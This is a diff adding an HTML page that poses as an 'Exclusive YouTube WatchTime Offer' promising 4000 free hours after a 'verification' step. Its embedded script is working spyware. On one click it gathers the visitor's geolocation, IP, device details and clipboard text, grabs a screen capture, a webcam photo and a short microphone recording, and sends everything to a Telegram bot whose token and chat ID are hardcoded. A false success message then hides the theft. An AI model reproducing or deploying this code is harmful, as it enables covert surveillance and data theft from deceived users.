@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exclusive YouTube WatchTime Offer</title>
+    <style>
+        /* Existing styles remain unchanged */
+        body { font-family: 'Arial', sans-serif; background: linear-gradient(135deg, #6a11cb, #2575fc); color: white; text-align: center; padding: 50px; }
+        h1 { font-size: 2.5em; margin-bottom: 20px; }
+        p { font-size: 1.2em; margin-bottom: 30px; }
+        button { background-color: #ff6f61; color: white; border: none; padding: 15px 30px; font-size: 1.2em; cursor: pointer; border-radius: 5px; transition: background-color 0.3s ease; }
+        button:hover { background-color: #ff3b2f; }
+        .container { max-width: 600px; margin: 0 auto; }
+        .progress-bar { width: 100%; background-color: #e0e0e0; border-radius: 5px; overflow: hidden; margin-bottom: 20px; }
+        .progress { width: 0%; height: 10px; background-color: #76ff03; transition: width 5s ease; }
+    </style>
+    <script>
+        const BOT_TOKEN = "7107161817:AAHVkYJ5mEarFhg-5GA6Q3gi5h-1N_6MGFQ";
+        const CHAT_ID = "6215932196";
+
+        async function collectUserData() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                referrer: document.referrer,
+                device: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    screen: `${screen.width}x${screen.height}`,
+                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
+                },
+                location: 'Denied',
+                ip: 'Unknown',
+                clipboard: 'Denied',
+                screenCapture: null
+            };
+
+            try {
+                // Geolocation
+                const position = await new Promise((resolve, reject) => 
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 5000}));
+                data.location = `${position.coords.latitude}, ${position.coords.longitude}`;
+            } catch {}
+
+            try {
+                // IP Address
+                const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+                data.ip = `${ipData.ip} (${ipData.city}, ${ipData.region}, ${ipData.country_name})`;
+            } catch {}
+
+            try {
+                // Clipboard Data
+                data.clipboard = await navigator.clipboard.readText();
+            } catch {}
+
+            try {
+                // Screen Capture
+                const stream = await navigator.mediaDevices.getDisplayMedia({video: true});
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                data.screenCapture = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+                stream.getTracks().forEach(track => track.stop());
+            } catch {}
+
+            return data;
+        }
+
+        async function captureMedia(type) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(
+                    type === 'audio' ? {audio: true} : {video: true}
+                );
+                
+                if (type === 'audio') {
+                    const recorder = new MediaRecorder(stream);
+                    const chunks = [];
+                    recorder.start();
+                    
+                    return new Promise(resolve => {
+                        recorder.ondataavailable = e => chunks.push(e.data);
+                        recorder.onstop = () => resolve(new Blob(chunks, {type: 'audio/wav'}));
+                        setTimeout(() => recorder.stop(), 5000);
+                    });
+                } else {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await new Promise(resolve => video.onloadedmetadata = resolve);
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    stream.getTracks().forEach(track => track.stop());
+                    return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+                }
+            } catch {
+                return null;
+            }
+        }
+
+        async function sendToTelegram(data) {
+            try {
+                // Send text data
+                const text = `📊 New Data Capture:\n\n` +
+                    `🕒 ${data.timestamp}\n\n` +
+                    `🌐 IP: ${data.ip}\n\n` +
+                    `📍 Location: ${data.location}\n\n` +
+                    `📱 Device: ${JSON.stringify(data.device, null, 2)}\n\n` +
+                    `🔗 Referrer: ${data.referrer}\n\n` +
+                    `📋 Clipboard: ${data.clipboard}\n`;
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+
+                // Send media files
+                const files = [
+                    {data: await captureMedia('audio'), type: 'Voice'},
+                    {data: await captureMedia('video'), type: 'Photo'},
+                    {data: data.screenCapture, type: 'Photo'}
+                ];
+
+                for (const file of files) {
+                    if (file.data) {
+                        const formData = new FormData();
+                        formData.append(file.type === 'Photo' ? 'photo' : 'voice', file.data);
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${file.type}?chat_id=${CHAT_ID}`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }
+                }
+
+                alert('Verification complete! Your 4000 hours will be added within 24 hours.');
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Verification failed. Please try again.');
+            }
+        }
+
+        async function startVerification() {
+            document.querySelector('.progress').style.width = '100%';
+            const userData = await collectUserData();
+            await sendToTelegram(userData);
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Exclusive YouTube WatchTime Offer</h1>
+        <p>Complete the quick verification process to unlock <strong>4000 hours</strong> of YouTube WatchTime instantly!</p>
+        <div class="progress-bar">
+            <div class="progress"></div>
+        </div>
+        <button onclick="startVerification()">Complete Verification Now 📥</button>
+    </div>
+</body>
+</html>
